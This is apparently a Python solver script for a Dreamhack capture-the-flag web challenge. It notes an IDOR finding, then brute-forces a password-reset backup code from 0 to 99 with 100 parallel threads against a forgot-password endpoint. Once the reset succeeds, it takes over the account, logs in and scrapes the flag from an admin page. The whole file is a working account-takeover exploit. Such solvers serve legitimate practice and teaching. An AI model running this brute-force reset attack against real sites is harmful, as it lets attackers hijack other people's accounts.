import requests, threading, re

url = 'http://host3.dreamhack.games:9606'

# IDOR
#    GET /user/1
#    UserID: Apple
#    UserName: Apple
#    UserLevel: 1

stop_event = threading.Event()

def get_flag():
    sess = requests.session()
    sess.post(f'{url}/login', data={'userid': 'Apple', 'password': 'Apple'})
    res = sess.get(f'{url}/admin')
    match = re.search(r'DH\{[^>]*\}', res.text)
    print(match.group(0))


def forgot_password(backupCode):
    data = {"userid": "Apple", "newpassword": "Apple", "backupCode": backupCode}
    res = requests.post(f"{url}/forgot_password", data=data)

    if stop_event.is_set():
        return

    if 'Password Change Success.' in res.text:
        stop_event.set()
        # print('Password Change Success.')
        get_flag()
        return

threads = []

for i in range(100):
    t = threading.Thread(target=forgot_password, args=(i,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
